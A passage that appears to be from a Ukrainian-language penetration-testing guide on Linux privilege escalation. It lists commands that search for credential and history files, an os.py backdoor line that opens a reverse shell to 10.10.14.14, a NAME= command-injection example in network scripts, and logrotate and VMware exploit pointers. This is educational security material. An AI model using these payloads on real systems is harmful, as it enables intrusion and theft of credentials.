### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це додаток з відкритим кодом, що дозволяє витягувати велику кількість паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший лог, тим цікавіший він буде (ймовірно).\
Також деякі "**bad**" сконфігуровані (backdoored?) **журнали аудиту** можуть дозволити вам **записувати паролі** всередині журналів аудиту, як пояснено в цій статті: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб мати змогу читати логи, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell-файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Вам також слід перевіряти файли, що містять слово "**password**" у їхній **назві** або всередині **вмісту**, а також шукати IP-адреси і електронні пошти в логах або регулярні вирази для хешів.\
Я не збираюся тут перераховувати, як робити все це, але якщо вас цікавить, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватися python-скрипт і ви **можете записувати** в цю папку або можете **змінювати python бібліотеки**, ви можете змодифікувати бібліотеку os та backdoor її (якщо ви можете записувати туди, де виконуватиметься python-скрипт, скопіюйте і вставте бібліотеку os.py).

Щоб **backdoor the library** просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP та PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Уразливість у `logrotate` дозволяє користувачам з **правами на запис** на лог-файл або його батьківські каталоги потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто працює від імені **root**, можна змусити виконувати довільні файли, особливо в каталогах типу _**/etc/bash_completion.d/**_. Важливо перевіряти права не тільки в _/var/log_, але й у будь-якому каталозі, де застосовується ротація логів.

> [!TIP]
> Ця уразливість впливає на версії `logrotate` `3.18.0` і старіші

Більш детальну інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю уразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви виявите, що можете змінювати логи, перевірте, хто ними керує, і чи можна підвищити привілеї, підставивши логи через символьні посилання.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` до _/etc/sysconfig/network-scripts_ **або** може **змінити** існуючий — тоді ваша **system is pwned**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих підключень. Вони виглядають точно як .INI files. Однак вони \~sourced\~ в Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється неправильно. Якщо у імені є **пробіл/білі символи, система намагається виконати частину після пробілу**. Це означає, що **все, що йде після першого пробілу, виконується від імені root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd, and rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit) — **класичної системи керування сервісами Linux**. Він включає скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Ці скрипти можна виконувати напряму або через символічні посилання в `/etc/rc?.d/`. У системах Redhat альтернативний шлях — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язаний з **Upstart**, новішою системою керування сервісами, представеною Ubuntu, яка використовує конфігураційні файли для управління сервісами. Попри перехід на Upstart, скрипти SysVinit все ще використовуються разом із конфігураціями Upstart завдяки суміснісному шару в Upstart.

**systemd** є сучасним ініціалізатором та менеджером сервісів, що пропонує розширені можливості, такі як запуск демонів на вимогу, керування automount і знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива та `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай перехоплюють syscall, щоб відкрити привілейовану функціональність ядра для userspace-менеджера. Слабка автентифікація менеджера (наприклад, перевірки підписів, засновані на FD-order, або ненадійні схеми паролів) може дозволити локальному додатку імітувати менеджера та підвищити привілеї до root на пристроях, що вже мають root. Дізнатись більше та деталі експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-орієнтоване виявлення сервісів у VMware Tools/Aria Operations може витягувати шлях до бінарного файлу з командних рядків процесів та виконувати його з параметром -v у привілейованому контексті. Допускаючі патерни (наприклад, використання \S) можуть співпадати з розміщеними зловмисником listeners у записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання від імені root (CWE-426 Untrusted Search Path).

Дізнатись більше і побачити узагальнену схему, яка застосовується до інших стеків discovery/monitoring, тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захисти ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
